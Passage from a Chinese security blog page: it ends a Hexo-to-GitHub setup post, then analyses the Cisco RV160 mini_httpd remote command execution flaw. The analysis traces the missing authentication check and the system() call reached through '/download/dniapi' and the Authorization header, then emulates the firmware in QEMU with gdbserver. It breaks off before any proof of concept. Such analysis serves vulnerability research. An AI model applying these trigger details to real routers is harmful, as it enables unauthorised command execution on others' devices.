+<h3 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h3><p>错误解决：这是因为没安装<code>hexo-deployer-git</code>插件，在<strong>站点目录</strong>下输入下面的插件安装就好了：</p>
+<blockquote>
+<p>npm install hexo-deployer-git –save<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215153413338.png"></p>
+</blockquote>
+<p>部署  hexo -d</p>
+<p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215153513684.png"></p>
+<p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215154313076.png"><br>可以访问到了<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215154324906.png"></p>
+<h3 id="更改主题"><a href="#更改主题" class="headerlink" title="更改主题"></a>更改主题</h3><h4 id="更改titile"><a href="#更改titile" class="headerlink" title="更改titile"></a>更改titile</h4><p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215155927803.png"></p>
+<p>提交修改</p>
+<blockquote>
+<p>hexo clean<br>hexo g<br>hexo d</p>
+</blockquote>
+<h4 id="更改主题-1"><a href="#更改主题-1" class="headerlink" title="更改主题"></a>更改主题</h4><p>下载<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215160852822.png"><br>更改<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215160940638.png"></p>
+<p>主题<br>问题： 是因为有的东西还没加载，等一等就好了。<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215160908093.png"><br>使用Coder<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215165339843.png"></p>
+<h2 id="编写博客"><a href="#编写博客" class="headerlink" title="编写博客"></a>编写博客</h2><h3 id="上传md"><a href="#上传md" class="headerlink" title="上传md"></a>上传md</h3><p>把写好的md 复制到_post文件夹中。<br>需要先用记事本打开md，加上titile<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215175541083.png"></p>
+<p>然后</p>
+<blockquote>
+<p>hexo clean<br>hexo g<br>hexo d</p>
+</blockquote>
+<p>刷新查看<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215172256746.png"></p>
+<p>但是图片显示不出来</p>
+<h3 id="加载图片"><a href="#加载图片" class="headerlink" title="加载图片"></a>加载图片</h3><p>改为true<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215175200901.png"></p>
+<p>下载  </p>
+<blockquote>
+<p>npm install <a target="_blank" rel="noopener" href="https://github.com/CodeFalling/hexo-asset-image">https://github.com/CodeFalling/hexo-asset-image</a> –save</p>
+</blockquote>
+<p>图片目录，图片目录不能有空格。<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215175304128.png"><br>更改md图片路径<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215175329575.png"></p>
+<p>Cactus<br><a href="https://link.zhihu.com/?target=https://github.com/probberechts/hexo-theme-cactus">https://link.zhihu.com/?target=https%3A//github.com/probberechts/hexo-theme-cactus</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tig3rhu.github.io/2023/12/15/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" data-id="clq9l1r3h0000ysvb8i4oh5wf" data-title="github 博客搭建记录" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Cisco Rv160 远程命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/15/Cisco%20Rv160%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T09:01:20.368Z" itemprop="datePublished">2023-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/15/Cisco%20Rv160%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Cisco Rv160 远程命令执行漏洞分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Cisco-Rv160-远程命令执行"><a href="#Cisco-Rv160-远程命令执行" class="headerlink" title="Cisco Rv160 远程命令执行"></a>Cisco Rv160 远程命令执行</h1><h2 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h2><p><a target="_blank" rel="noopener" href="https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv160-260-rce-XZeFkNHf.html">https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv160-260-rce-XZeFkNHf.html</a></p>
+<h2 id="0x02-固件解包"><a href="#0x02-固件解包" class="headerlink" title="0x02 固件解包"></a>0x02 固件解包</h2><p>解开固件包，定位到mini_httpd 的web 组件</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202102701684.png" alt="image-20211202102701684"></p>
+<p>arm 架构</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202102835220.png" alt="image-20211202102835220"></p>
+<p>根据httpd 检索出了两个文件。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202103921752.png" alt="image-20211202103921752"></p>
+<h2 id="0x03-mini-httpd-分析"><a href="#0x03-mini-httpd-分析" class="headerlink" title="0x03 mini_httpd 分析"></a>0x03 mini_httpd 分析</h2><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p> 在进行IDA 分析cisco 160W 0.1 版本的mini_httpd 时，遇到了如下问题，但是并不影响反汇编F5。</p>
+<p>根据网上查阅的信息来看，这是因为栈帧不平衡，需要手动调整栈帧。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DorinXL/p/13657972.html">https://www.cnblogs.com/DorinXL/p/13657972.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/feibabeibei_beibei/article/details/85238676">https://blog.csdn.net/feibabeibei_beibei/article/details/85238676</a></p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202110226642.png" alt="image-20211202110226642"></p>
+<h3 id="mini-httpd-分析"><a href="#mini-httpd-分析" class="headerlink" title="mini_httpd 分析"></a>mini_httpd 分析</h3><p>分析这个漏洞的时候，我并没有很仔细的查看漏洞相关分析文章，而是直接解开固件，进行分析，抱着一种如果当时是自己在分析这个固件，应该会从哪个方面入手的想法，是否可以发现漏洞点和漏洞触发的方式。</p>
+<p>接下来我将分享我对这个漏洞分析的逻辑与思路，首先我将mini_httpd 组件放入到IDA中，在逆向分析的过程中，由于对mini_httpd 源码已经大致看过了，因此，我对mini_httpd 组件的中的反汇编代码依次进行分析。</p>
+<p>根据上面的截图的 _libc_start_main()函数的定义，可以确定 mian 参数是 mini_httpd中的main 函数。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202144010024.png" alt="image-20211202144010024"></p>
+<p>根据mini_httpd组件中mini_httpd.c 的源码和本固件的mini_httpd 来对比，sub_11FA0() 函数就是mini_httpd.c 中的mian()函数。</p>
+<p>进入到sub_11FA0()函数中，可以看到mini_httpd 的版本是1.27的。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202144838659.png" alt="image-20211202144838659"></p>
+<p>在函数的底部找到了处理 进程的 handle_request() 函数。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202223259036.png" alt="image-20211202223259036"></p>
+<p>进入到handle_request，我根据mini_httpd.c 的源代码对比反汇编出来的handle_request 函数进行比对，找出mini_httpd中开发者二次开发的代码。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202224312529.png" alt="image-20211202224312529"></p>
+<p>根据 mini_httpd.c 中的hand_request() 函数源码来看，mini_httpd 反汇编出来的代码并没有 do_dir() 函数。</p>
+<p>在跟进了mini_httpd.c 中的do_dir()函数的代码后，do_dir()函数通过调用auth_check()函数处理当前访问的文件路径是否符合访问权限。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202230935935.png" alt="image-20211202230935935"></p>
+<p>进入到 do_file() 函数中，这个函数有两个要值得注意的点，首先在mini_http.c 源代码中，有一个auth_check()函数，该函数适用于对文件进行权限认证的函数，只有经过权限认证后，才能访问其他的文件，但是在Cisco RV160 的组件Mini_httpd的反汇编代码do_file()并没有这个函数，因此埋下了后面不需要认证即可出发漏洞的隐患。另一个是sub_1A58() 函数，这个函数在min_httpd.c中并不真实存在，因而这个函数是开发者二次开发留下的代码，传入dword_35164 的值作为参数。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202233311868.png" alt="image-20211202233311868"></p>
+<p>进入到sub_1AF58() 函数，该函数最终会将传入的dword_35164的值给v5, 然后将格式化的字符串调用system 函数进行执行。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206220714253.png" alt="image-20211206220714253"></p>
+<h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据前面的Cisco Rv160W 固件中mini_httpd和mini_httpd.c 源代码进行比对分析。在sub_1AF58() 函数中存在执行命令的漏洞，并且需要到达漏洞函数sub_1AF58()，函数的参数dword_35164 中要有 “ download&#x2F; “  字符串，才能跳转到do_file() 函数</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206222751530.png" alt="image-20211206222751530"></p>
+<p>接个根据参数往上一层追溯，该函数的参数dword_35164 中要有 “ dniapi&#x2F; “  字符串，才能跳转到do_file() 函数，根据上面strncmp函数，可以判定参数的格式为”&#x2F;download&#x2F;dniapi”</p>
+<blockquote>
+<p><strong>char *strstr(const char *haystack, const char *needle)</strong> 在字符串 <strong>haystack</strong> 中查找第一次出现字符串 <strong>needle</strong> 的位置，不包含终止符 ‘\0’</p>
+</blockquote>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206222553826.png" alt="image-20211206222553826"></p>
+<p>在dword_34F60 的值将赋值给dword_35164。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206223618352.png" alt="image-20211206223618352"></p>
+<p>而dword_34F60 的值则在如下的代码中进行解析，这个部分的代码在mini_httpd.c 中是一样的。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206223847690.png" alt="image-20211206223847690"></p>
+<p>接下来分析在sub_1AF58()函数中的漏洞点，其中dword_35180的值是Authorization的值，而获取的值中要包含 “ Basic ” 字符串。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206225203066.png" alt="image-20211206225203066"></p>
+<p>Authorization:</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206225023028.png" alt="image-20211206225023028"></p>
+<h2 id="0x05-环境搭建"><a href="#0x05-环境搭建" class="headerlink" title="0x05 环境搭建"></a>0x05 环境搭建</h2><p>首先查看文件系统的指令架构，文件系统位ARM </p>
+<figure class="highlight plaintext"><figcaption><span>~/i/g/c/_/_/_/_/_/u/4/r/bin> file ./busybox</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 2.6.16, stripped</span><br></pre></td></tr></table></figure>
+
+<p>配置qemu 之前的环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~&gt; cat /etc/network/interfaces</span><br><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">#up ifconfig eth0 0.0.0.0 up</span><br><span class="line">#auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> bridge_ports eth0</span><br><span class="line"> bridge_maxwait 0</span><br><span class="line"></span><br><span class="line">tigerortiger@ubuntu ~&gt; cat /etc/qemu-ifup</span><br><span class="line">#! /bin/sh</span><br><span class="line"># Script to bring a network (tap) device for qemu up.</span><br><span class="line"># The idea is to add the tap device to the same bridge</span><br><span class="line"># as we have default routing to.</span><br><span class="line"></span><br><span class="line"># in order to be able to find brctl</span><br><span class="line">echo &quot;Execute /etc/qemu-ifup&quot;</span><br><span class="line">#sudo ifdown eth0</span><br><span class="line">#sudo ifup br0</span><br><span class="line">echo &quot;Bringing up $1 for bridge mode..&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;adding $1 to br0&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 2</span><br><span class="line">tigerortiger@ubuntu ~&gt; sudo /etc/init.d/networking restart </span><br><span class="line">[ ok ] Restarting networking (via systemctl): networking.service.</span><br><span class="line">tigerortiger@ubuntu ~&gt; sudo ifdown eth0 </span><br><span class="line">Killed old client process</span><br><span class="line">Internet Systems Consortium DHCP Client 4.3.5</span><br><span class="line">Copyright 2004-2016 Internet Systems Consortium.</span><br><span class="line">All rights reserved.</span><br><span class="line">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class="line"></span><br><span class="line">Listening on LPF/eth0/00:0c:29:e5:1b:a2</span><br><span class="line">Sending on   LPF/eth0/00:0c:29:e5:1b:a2</span><br><span class="line">Sending on   Socket/fallback</span><br><span class="line">DHCPRELEASE on eth0 to 192.168.214.254 port 67 (xid=0x4c602cbd)</span><br><span class="line">tigerortiger@ubuntu ~&gt; sudo ifup br0</span><br><span class="line">Internet Systems Consortium DHCP Client 4.3.5</span><br><span class="line">Copyright 2004-2016 Internet Systems Consortium.</span><br><span class="line">All rights reserved.</span><br><span class="line">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class="line"></span><br><span class="line">Listening on LPF/br0/00:0c:29:e5:1b:a2</span><br><span class="line">Sending on   LPF/br0/00:0c:29:e5:1b:a2</span><br><span class="line">Sending on   Socket/fallback</span><br><span class="line">DHCPDISCOVER on br0 to 255.255.255.255 port 67 interval 3 (xid=0xd8f3411e)</span><br><span class="line">DHCPREQUEST of 192.168.214.129 on br0 to 255.255.255.255 port 67 (xid=0x1e41f3d8)</span><br><span class="line">DHCPOFFER of 192.168.214.129 from 192.168.214.254</span><br><span class="line">DHCPACK of 192.168.214.129 from 192.168.214.254</span><br><span class="line">bound to 192.168.214.129 -- renewal in 852 seconds.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207142457380.png" alt="image-20211207142457380"></p>
+<p>配置IP，保证qemu 和宿主机网络能畅通。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207143748443.png" alt="image-20211207143748443"></p>
+<p>把固件文件系统拷贝到qemu 中。</p>
+<figure class="highlight plaintext"><figcaption><span>~/i/g/c/_/_/_/_/_/u/454748969 [1]> pwd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/tigerortiger/iot/gujian/cisco/_RV16X_26X-v1.0.01.01-2020-08-17-11-09-01-AM.img.extracted/_40.extracted/_fw.gz.extracted/_0.extracted/_openwrt-comcerto2000-hgw-rootfs-ubi_nand.img.extracted/ubifs-root/454748969</span><br><span class="line">tigerortiger@ubuntu ~/i/g/c/_/_/_/_/_/u/454748969&gt; scp -r ./rootfs root@192.168.214.130:/root/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>挂载关键目录</p>
+<p>mount -t proc  &#x2F;proc&#x2F; .&#x2F;proc&#x2F;</p>
+<p>mount -t devtmpfs &#x2F;dev&#x2F; .&#x2F;dev&#x2F;</p>
+<blockquote>
+<p>挂载指的是将硬件设备的文件系统和Linux 系统中的文件系统，通过指定目录（作为挂载点）进行关联，而要将文件系统挂载到Linux系统上，就需要使用mount挂载命令。</p>
+<p>mount 设备文件名 挂载点</p>
+</blockquote>
+<p>chroot 出现了错误。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207173855519.png" alt="image-20211207173855519"></p>
+<p> chroot: failed to run command &#96;.&#x2F;bin&#x2F;sh’: Permission denied</p>
+<p>解决方案</p>
+<p>chmod -R 777 .&#x2F;cisco_RV160</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207173949545.png" alt="image-20211207173949545"></p>
+<p>启动mini_httpd.init 文件。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207201528596.png" alt="image-20211207201528596"></p>
+<figure class="highlight plaintext"><figcaption><span>#</span><a href="/etc/init.d/mini_httpd.init">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/ # /etc/init.d/mini_httpd.init </span><br><span class="line">uci: Entry not found</span><br><span class="line">Syntax: /etc/init.d/mini_httpd.init [command]</span><br><span class="line"></span><br><span class="line">Available commands:</span><br><span class="line">	start	Start the service</span><br><span class="line">	stop	Stop the service</span><br><span class="line">	restart	Restart the service</span><br><span class="line">	reload	Reload configuration files (or restart if that fails)</span><br><span class="line">	enable	Enable service autostart</span><br><span class="line">	disable	Disable service autostart</span><br><span class="line"></span><br><span class="line">/ # /etc/init.d/mini_httpd.init start</span><br><span class="line">uci: Entry not found</span><br><span class="line">ls: /mnt/configcert/confd/startup/: No such file or directory</span><br><span class="line">use backup cert for mini-httpd ...</span><br><span class="line">1 0 0 0</span><br><span class="line">setsockopt SO_REUSEADDR: Protocol not available</span><br><span class="line">setsockopt SO_REUSEADDR: Protocol not available</span><br><span class="line">/usr/sbin/mini_httpd: can&#x27;t bind to any address</span><br></pre></td></tr></table></figure>
+
+<p>根据执行mini_httpd.init 的报错信息来看，setsockopt()函数调用时报错,这个函数的定义如下。</p>
+<blockquote>
+<p>定义函数：int setsockopt(int s, int level, int optname, const void * optval, ,socklen_toptlen);</p>
+<p>函数说明：setsockopt()用来设置参数s 所指定的socket 状态</p>
+</blockquote>
+<p>这里我们直接使用加载LD_PRELOAD 来进行hook，这里要注意的是hook和setsockopt一样的函数，包括名称、变量及类型、返回值及类型等。</p>
+<p>查看mini_httpd 中setsockopt函数的定义</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211207215016628.png" alt="image-20211207215016628"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line"></span><br><span class="line">/* arm-linux-gnueabi-gcc -shared -fPIC hook_setsockopt.c -o hooksetsockopt  */</span><br><span class="line">int setsockopt(int fd, int level, int optname, const void *optval, socklen_t optlen)</span><br><span class="line">&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译hook_setsockopt.c </p>
+<p>tigerortiger@ubuntu ~&#x2F;i&#x2F;g&#x2F;c&#x2F;<em>&#x2F;</em>&#x2F;<em>&#x2F;</em>&#x2F;<em>&#x2F;u&#x2F;4&#x2F;rootfs&gt;<br>arm-linux-gnueabi-gcc -shared -fPIC hook_setsockopt.c -o hook_setsockopt<br>tigerortiger@ubuntu ~&#x2F;i&#x2F;g&#x2F;c&#x2F;</em>&#x2F;<em>&#x2F;</em>&#x2F;<em>&#x2F;</em>&#x2F;u&#x2F;4&#x2F;rootfs&gt; file hook_setsockopt<br>hook_setsockopt: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, BuildID[sha1]&#x3D;7708ce4cab994360cc2082b5e82caf10f7ba881e, not stripped</p>
+<p>启动 mini_httpd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@debian-armhf:~/cisco_rv160# chroot . ./bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.23.2 (2020-08-17 10:59:42 IST) built-in shell (ash)</span><br><span class="line"></span><br><span class="line">/ # ls</span><br><span class="line">bin              media            root             usr</span><br><span class="line">dev              mnt              sbin             var</span><br><span class="line">etc              overlay          sys              www</span><br><span class="line">hook_setsockopt  proc             test_scripts</span><br><span class="line">lib              rom              tmp</span><br><span class="line">/ # LD_PRELOAD=&quot;/hook_setsockopt&quot; ./usr/sbin/mini_httpd -p 8009</span><br><span class="line">bind: Address already in use</span><br><span class="line">/ # ./usr/sbin/mini_httpd: started as root without requesting chroot(), warning only</span><br><span class="line"></span><br><span class="line">/ # exit</span><br><span class="line">root@debian-armhf:~/cisco_rv160# ps -ef | grep &quot;mini_httpd&quot;</span><br><span class="line">root      2606     1  0 11:42 ?        00:00:00 ./usr/sbin/mini_httpd</span><br><span class="line">root      2608  2324 20 11:43 ttyAMA0  00:00:00 grep mini_httpd</span><br><span class="line">root@debian-armhf:~/cisco_rv160# lsof -i:8009</span><br><span class="line">COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">mini_http 3222 root    3u  IPv6   6465      0t0  TCP *:8009 (LISTEN)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208165707403.png" alt="image-20211208165707403"></p>
+<p>batch</p>
+<p>ARM 汇编的NOP 指令是 mov r0,r0 。直接patch sub_1B5F0 为NOP, 这样就不会报错了，程序继续往下执行。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208104529045.png" alt="image-20211208104529045"></p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208104402863.png" alt="image-20211208104402863"></p>
+<p>重新启动mini_http 组件，可以看到设备的访问界面了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=&quot;/hook_setsockopt&quot; ./usr/sbin/mini_http_hook -p 9009</span><br></pre></td></tr></table></figure>
+
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211208171114599.png" alt="image-20211208171114599"></p>
+<h2 id="0x06-远程调试漏洞"><a href="#0x06-远程调试漏洞" class="headerlink" title="0x06 远程调试漏洞"></a>0x06 远程调试漏洞</h2><p>开启远程调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@debian-armhf:~/cisco_rv160# ps -ef | grep &quot;mini_http_hook&quot;</span><br><span class="line">root      3351     1  0 20:32 ?        00:00:00 ./usr/sbin/mini_http_hook -p 8009</span><br><span class="line">root      3354  2324  0 20:33 ttyAMA0  00:00:00 grep mini_http_hook</span><br><span class="line">root@debian-armhf:~/cisco_rv160# ./gdbserver :1234 --attach 3351</span><br><span class="line">Attached; pid = 3351</span><br><span class="line">Listening on port 1234</span><br></pre></td></tr></table></figure>
+
+<p>远程连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu &gt; gdb-multiarch -q mini_httpd</span><br><span class="line">pwndbg&gt; set architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; target remote 192.168.214.130:1234</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发送POC</p>
